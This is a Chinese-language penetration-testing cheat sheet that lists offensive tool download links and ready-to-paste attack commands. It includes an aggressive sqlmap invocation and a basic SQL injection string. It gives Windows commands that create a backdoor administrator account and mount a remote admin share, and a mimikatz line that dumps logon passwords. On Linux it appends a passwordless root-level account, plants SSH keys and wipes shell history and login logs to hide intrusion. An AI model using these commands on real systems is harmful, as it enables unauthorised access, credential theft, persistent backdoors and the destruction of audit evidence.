漏洞利用：Metasploit
https://rpm.metasploit.com/
https://windows.metasploit.com/

漏洞扫描：Nessus
https://www.tenable.com/products/nessus/select-your-operating-system

漏洞渗透：Burp Suite、Zed Attack Proxy
https://portswigger.net/bappstore
https://portswigger.net/burp/releases
https://portswigger.net/burp/releases/download?product=pro
https://github.com/zaproxy/zaproxy

网络扫描：Nmap
https://nmap.org/download.html
https://github.com/nmap/nmap/tree/master/ncat

SQL 注入：sqlmap
https://github.com/sqlmapproject/sqlmap/archive/master.zip
-----
python sqlmap.py -r 123.log -p id -v 3 --dbms=oracle --risk=3 --level=5 --tamper=space2comment --timeout=10 --code=200 --string="200 OK"
-----
'or '1'='1

API 测试：Postman
https://www.getpostman.com/downloads/

Windows 用户提权：
CMD /C NET USER admin 123456 /ADD
CMD /C NET LOCALGROUP Administrators admin /ADD
CMD /C NET USER admin /ACTIVE:YES

Windows 远程复制：
NET USE X: \\218.221.10.56\D$ /USER:admin 123456
COPY X:\doc\123.txt . /Y
NET USE X: /DELETE /Y

Windows 密码：mimikatz
https://github.com/gentilkiwi/mimikatz
-----
mimikatz.exe "log 123.log" version hostname privilege::debug sekurlsa::logonpasswords exit

Linux：
1. 上传公钥
ssh-copy-id root@218.221.10.50
ssh root@218.221.10.50
2. 添加账号
echo "sqnuid:x:0:0::/:/bin/bash" >> /etc/passwd
echo "sqnuid::::::::" >> /etc/shadow

Linux 清空痕迹：
cat /root/.bash_history
who
unset HISTFILE
echo > /var/run/utmp
echo > /var/log/wtmp
echo > /var/log/btmp
echo > /var/log/secure
echo > /var/log/lastlog

无线网卡：
https://wikidevi.wi-cat.ru/Wireless_adapters/Chipset_table

无线路由器：
https://openwrt.org/toh/start
```

## Android USB 代理网络
```bash
adb reverse tcp:9527 tcp:8080
adb reverse --list
adb reverse --remove-all
---
adb shell settings put global http_proxy 127.0.0.1:9527
adb shell settings delete global http_proxy
```
